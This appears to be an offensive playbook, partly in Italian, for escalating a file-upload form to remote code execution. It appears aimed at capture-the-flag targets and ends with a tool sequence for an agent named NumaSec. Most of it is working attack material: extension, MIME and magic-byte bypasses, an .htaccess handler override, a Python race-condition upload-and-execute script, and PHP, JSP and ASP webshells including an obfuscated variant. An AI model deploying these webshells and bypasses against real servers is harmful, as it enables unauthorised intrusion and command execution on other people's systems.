# Attack Chain: Upload → RCE

Sequenza per escalare da File Upload a Remote Code Execution.

---

## 🔴 Quando Usare

- Form upload file presente
- Obiettivo: caricare webshell
- Target: PHP, JSP, ASP

---

## Phase 1: Identify Upload Restrictions

1. **Extension check** - Blocca .php?
2. **MIME type check** - Verifica Content-Type?
3. **Magic bytes check** - Controlla header file?
4. **File size limit** - Max dimensione?
5. **Rename on upload** - Rinomina il file?

---

## Phase 2: Extension Bypass

### Case variation
```
shell.pHp
shell.PHP
shell.Php
```

### Alternative extensions
```
# PHP
shell.php3, shell.php4, shell.php5, shell.php7
shell.phtml, shell.phar, shell.pgif, shell.shtml
shell.inc, shell.phps

# JSP
shell.jspx, shell.jspf

# ASP
shell.asp, shell.aspx, shell.cer, shell.asa
```

### Double extension
```
shell.php.jpg
shell.php.png
shell.jpg.php
```

### Null byte (old PHP)
```
shell.php%00.jpg
shell.php\x00.jpg
```

### Special characters
```
shell.php....
shell.php%20
shell.php%0a
shell.php;.jpg
```

---

## Phase 3: MIME Type Bypass

```bash
# Cambia Content-Type header
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif

# Con curl
curl -F "file=@shell.php;type=image/jpeg" URL/upload
```

---

## Phase 4: Magic Bytes Bypass

Aggiungi header file valido prima del codice:

```bash
# GIF
GIF89a<?php system($_GET['c']); ?>

# PNG  
\x89PNG\r\n\x1a\n<?php system($_GET['c']); ?>

# JPEG
\xFF\xD8\xFF<?php system($_GET['c']); ?>

# Con exiftool (in metadata)
exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg
mv image.jpg image.php.jpg
```

---

## Phase 5: .htaccess Upload

Se puoi caricare .htaccess:

```apache
# .htaccess content
AddType application/x-httpd-php .gif
AddType application/x-httpd-php .jpg
```

Poi carica webshell con estensione .gif o .jpg.

---

## Phase 6: Race Condition

Se il file viene eliminato dopo l'upload:

```python
import threading
import requests

def upload():
    while True:
        requests.post(UPLOAD_URL, files={'file': open('shell.php')})

def execute():
    while True:
        r = requests.get(SHELL_URL + '?c=cat+/flag.txt')
        if 'flag' in r.text:
            print(r.text)
            break

t1 = threading.Thread(target=upload)
t2 = threading.Thread(target=execute)
t1.start()
t2.start()
```

---

## Phase 7: Webshells

### PHP minimal
```php
<?php system($_GET['c']); ?>
```

### PHP one-liner
```php
<?=`$_GET[c]`?>
```

### PHP obfuscated
```php
<?php $x="sys"."tem";$x($_GET['c']); ?>
```

### JSP
```jsp
<% Runtime.getRuntime().exec(request.getParameter("c")); %>
```

### ASP
```asp
<% eval request("c") %>
```

---

## Phase 8: Find Uploaded File

```
# Common paths
/uploads/shell.php
/images/shell.php
/files/shell.php
/upload/shell.php
/media/shell.php
/static/shell.php

# With directory listing
/uploads/

# With filename from response
[parse response per upload path]
```

---

## Decision Tree

```
Upload Form Found?
├── Extension blocked?
│   ├── Try alternatives (.phtml, .php5)
│   ├── Try double ext (.php.jpg)
│   └── Try case (.pHp)
├── MIME blocked?
│   └── Set Content-Type: image/jpeg
├── Content check?
│   └── Add GIF89a header
├── .htaccess allowed?
│   └── Upload .htaccess + shell.gif
└── Renamed?
    └── Check response for new filename
```

---

## Tool Sequence (NumaSec)

1. `navigate` → Find upload form
2. `run_python` → Upload with bypass attempts
3. `navigate` → Check /uploads/ directory
4. `submit` → Execute webshell with `?c=cat+/flag*`
